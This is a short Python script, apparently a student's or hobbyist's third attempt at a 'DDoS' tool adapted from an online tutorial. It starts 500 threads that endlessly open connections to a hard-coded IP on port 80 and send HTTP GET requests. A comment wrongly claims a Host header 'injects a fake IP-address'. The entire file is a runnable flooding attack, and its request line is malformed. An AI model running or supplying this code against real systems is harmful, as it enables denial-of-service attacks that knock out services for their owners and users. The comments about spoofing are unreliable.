#Third try of DDoS code
import socket;
import threading;

target_Ip = '192.168.1.93'             #Target PC IP
#target_Ip = input("Enter IP address of Target: ")
source_Ip = '192.168.1.79'
port_No = 80

#Function will perform the DoS attack
def myAttack():
    #create an endless loop
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                       #open a socket to connect to target device
        s.connect((target_Ip, port_No))                                                             #request connection to target
        s.sendto(("GET /" + target_Ip + "HTTP/1.1\r\n").encode('ascii'), (target_Ip, port_No))      #sends HTTP request to the given port & encode into bytes
        s.sendto(("Host: " + source_Ip + "\r\n\r\n").encode('ascii'), (target_Ip, port_No))         #inject fake IP-address & encode into bytes
        s.close()                                                                                   #close socket

# for i in range(50):
#     myThreads = threading.Thread(target = myAttack)
#     myThreads.start()
for i in range(500):
    myThreads = threading.Thread(target = myAttack)
    myThreads.start()



# code based and adapted from: https://www.neuralnine.com/code-a-ddos-script-in-python/

